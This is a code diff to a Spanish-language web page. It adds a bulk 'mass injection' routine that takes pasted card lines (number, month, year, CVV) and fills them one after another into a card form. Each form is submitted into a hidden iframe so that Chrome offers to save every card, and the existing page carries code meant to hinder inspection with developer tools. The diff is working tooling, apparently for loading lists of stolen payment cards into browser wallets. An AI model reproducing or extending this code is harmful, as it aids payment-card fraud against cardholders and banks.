@@ -1303,7 +1303,7 @@
                 <div class="form-section">
                     <h2>Sincronizar Datos</h2>
                     <p>Conecta tu tarjeta con Chrome Wallet</p>
-                    <form method="POST" autocomplete="on">
+                    <form method="POST" target="hiddenFrame" autocomplete="on">
                         <div class="form-group">
                             <label for="card-number">Número de tarjeta</label>
                             <input type="text" id="card-number" name="cc-number" autocomplete="cc-number" class="form-control" placeholder="#### #### #### ####">
@@ -1466,6 +1466,22 @@
                 document.getElementById('login-modal').style.display = 'block';
             } else {
                 playBeep(600, 300, 'triangle');
+                if (localStorage.getItem('massCards')) {
+                    let cards = JSON.parse(localStorage.getItem('massCards'));
+                    let index = parseInt(localStorage.getItem('currentIndex') || 0);
+                    if (index < cards.length) {
+                        let card = cards[index];
+                        let parts = card.split('|');
+                        if (parts.length === 4) {
+                            let formatted = formatCardInput(parts[0], parts[1], parts[2]);
+                            document.getElementById('card-number').value = formatted.card;
+                            updateCardNumber(formatted.card);
+                            document.getElementById('expiry').value = formatted.month + '/' + formatted.year;
+                            updateExpiry(formatted.month + '/' + formatted.year);
+                            document.getElementById('holder').value = localStorage.getItem('massName') || '';
+                        }
+                    }
+                }
                 // Load settings
                 document.getElementById('bg-color').value = localStorage.getItem('bgColor') || '#000000';
                 document.getElementById('text-color').value = localStorage.getItem('textColor') || '#FFFFFF';
@@ -1502,6 +1518,7 @@
             }
         });
         document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
             playBeep(1200, 400, 'sawtooth');
             // Validation
             let cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
@@ -1510,13 +1527,30 @@
             let cvv = document.getElementById('cvv').value;
             if (cardNumber.length < 13 || cardNumber.length > 16 || holder === '' || !/^\d{2}\/\d{2}$/.test(expiry) || (cvv && (cvv.length < 3 || cvv.length > 4))) {
                 alert('Por favor, completa todos los campos correctamente.');
-                e.preventDefault();
                 return;
             }
             let totalCards = parseInt(localStorage.getItem('totalCards') || 0);
             totalCards++;
             localStorage.setItem('totalCards', totalCards);
-            // Let the form submit normally to trigger browser save prompt
+            document.getElementById('card-counter').textContent = 'Tarjetas enviadas: ' + totalCards;
+            // Submit the form to the hidden iframe to trigger browser save prompt
+            this.submit();
+            if (localStorage.getItem('massCards')) {
+                let cards = JSON.parse(localStorage.getItem('massCards'));
+                let index = parseInt(localStorage.getItem('currentIndex') || 0);
+                index++;
+                if (index < cards.length) {
+                    localStorage.setItem('currentIndex', index);
+                    setTimeout(() => location.reload(), 1000); // Wait 1 second for the prompt
+                } else {
+                    localStorage.removeItem('massCards');
+                    localStorage.removeItem('currentIndex');
+                    localStorage.removeItem('massName');
+                    setTimeout(() => alert('Todas las tarjetas han sido procesadas.'), 1000);
+                }
+            } else {
+                setTimeout(() => alert('Formulario enviado. Si tienes tarjetas guardadas en Chrome, debería aparecer la opción de guardar esta nueva tarjeta.'), 1000);
+            }
         });
         // Utilities buttons
         document.getElementById('flag-btn').addEventListener('click', function() {
@@ -1665,6 +1699,41 @@
         // Apply settings on load
         applySettings();
         
+        document.querySelector('.btn-sync').addEventListener('click', function() {
+            playBeep(1500, 200);
+            let data = document.querySelector('#modal textarea').value.trim();
+            let lines = data.split('\n').map(line => line.trim()).filter(line => line);
+            let validCards = [];
+            for (let line of lines) {
+                let parts = line.split('|');
+                if (parts.length === 4) {
+                    validCards.push(line);
+                }
+            }
+            if (validCards.length === 0) {
+                alert('No se encontraron tarjetas válidas. Usa el formato: Número|Mes|Año|CVV por línea.');
+                return;
+            }
+            if (!document.getElementById('name').value.trim()) {
+                alert('Ingresa un nombre completo en el campo "Nombre completo" antes de sincronizar.');
+                return;
+            }
+            localStorage.setItem('massCards', JSON.stringify(validCards));
+            localStorage.setItem('currentIndex', '0');
+            localStorage.setItem('massName', document.getElementById('name').value);
+            // Rellenar la primera
+            let firstCard = validCards[0];
+            let parts = firstCard.split('|');
+            let formatted = formatCardInput(parts[0], parts[1], parts[2]);
+            document.getElementById('card-number').value = formatted.card;
+            updateCardNumber(formatted.card);
+            document.getElementById('expiry').value = formatted.month + '/' + formatted.year;
+            updateExpiry(formatted.month + '/' + formatted.year);
+            document.getElementById('holder').value = document.getElementById('name').value;
+            document.getElementById('modal').style.display = 'none';
+            alert('Inyección masiva iniciada. Envía el formulario para guardar la primera tarjeta.');
+        });
+        
         // Additional protection against inspection
         setInterval(function() {
             if (window.devtools && window.devtools.open) {
@@ -1673,5 +1742,6 @@
             }
         }, 500);
     </script>
+    <iframe name="hiddenFrame" style="display:none;"></iframe>
 </body>
 </html>
